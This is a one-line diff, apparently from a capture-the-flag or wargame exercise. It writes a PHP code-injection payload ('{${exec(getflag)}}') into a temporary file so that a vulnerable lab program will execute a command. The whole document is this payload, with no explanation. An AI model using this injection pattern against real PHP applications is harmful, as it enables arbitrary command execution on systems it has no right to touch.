@@ -1,0 +1,1 @@
+echo '[x {${exec(getflag)}}]' > /tmp/exploit.txt
